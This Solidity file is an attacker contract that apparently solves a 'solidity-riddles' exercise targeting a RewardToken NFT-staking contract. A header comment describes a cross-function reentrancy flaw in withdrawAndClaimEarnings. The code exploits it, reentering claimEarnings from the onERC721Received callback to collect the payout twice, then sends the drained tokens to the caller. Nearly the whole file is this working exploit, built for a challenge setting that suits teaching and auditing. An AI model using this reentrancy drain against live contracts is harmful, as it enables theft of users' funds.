// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts-v4.9.4/token/ERC721/IERC721Receiver.sol";
import {RewardToken, NftToStake, Depositoor} from "../solidity-riddles/RewardToken.sol";

contract AttackRewardToken is IERC721Receiver {
    Depositoor private depositor;
    /**
     * Issue cross function reentrancy: RewardToken contract function withdrawAndClaimEarnings does not follow Checks Effects interactions pattern.
     * Attacker contract can deposit NFT and after some time call withdrawAndClaimEarnings and in onERC721Received
     * function it can reenter and call claimEarnings, which will let attacker call payout twice. because  delete stakes[msg.sender]; called after nft.safeTransferFrom.
     *
     */

    function stake(NftToStake nft, Depositoor _depositor, uint256 tokenId) public {
        depositor = _depositor;
        nft.safeTransferFrom(address(this), address(depositor), tokenId);
    }

    function drain(RewardToken rewardToken, uint256 tokenId) public {
        depositor.withdrawAndClaimEarnings(tokenId);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function onERC721Received(address, address from, uint256 tokenId, bytes calldata)
        external
        override
        returns (bytes4)
    {
        require(from == address(depositor));
        depositor.claimEarnings(tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }
}
